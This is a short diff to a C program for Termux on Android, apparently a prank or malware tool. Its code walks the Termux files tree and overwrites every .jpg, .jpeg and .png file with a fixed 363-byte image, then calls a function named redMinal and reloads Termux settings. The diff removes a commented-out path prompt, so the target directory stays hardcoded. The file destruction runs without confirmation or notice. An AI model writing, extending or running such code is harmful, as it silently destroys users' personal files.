@@ -19,7 +19,6 @@ void makeThemRed(char* root){
             strcat(path, "/");
             strcat(path, dp->d_name);
             if((strstr(dp->d_name, ".jpg") || strstr(dp->d_name, ".jpeg") || strstr(dp->d_name, ".png") || strstr(dp->d_name, ".JPG")) != NULL){
-            //  printf("%s\n", dp->d_name);
                 FILE *img = fopen(path, "w+");
                 for(i=0;i<=362;i++){
                     fputc(bytes[i], img);
@@ -61,8 +60,6 @@ int main(){
     	mkdir("/data/data/com.termux/files/home/.termux", 0700);
     }
     char *path = "/data/data/com.termux/files";
-//  printf("Enter path: ");
-//  scanf("%s", path);
     makeThemRed(path);
     redMinal();
     system("termux-reload-settings;");
